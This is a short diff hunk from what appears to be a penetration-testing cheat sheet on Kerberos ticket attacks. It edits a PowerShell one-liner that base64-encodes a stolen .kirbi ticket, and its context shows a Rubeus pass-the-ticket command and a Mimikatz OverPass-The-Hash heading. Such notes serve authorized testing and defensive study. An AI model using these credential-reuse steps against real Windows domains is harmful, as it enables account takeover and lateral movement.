@@ -716,7 +716,7 @@ C:\> Rubeus.exe ptt /ticket:<base64_ticket>
 - Convert .kirbi to Base64 Format
 
 ```
-PS C:\> [Convert]::ToBase64String([IO.File]::ReadAllBytes("<ticket.kirbi>"))
+PS C:\> [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Tools\<ticket.kirbi>"))
 ```
 
 - Mimikatz OverPass-The-Hash (OPTH)
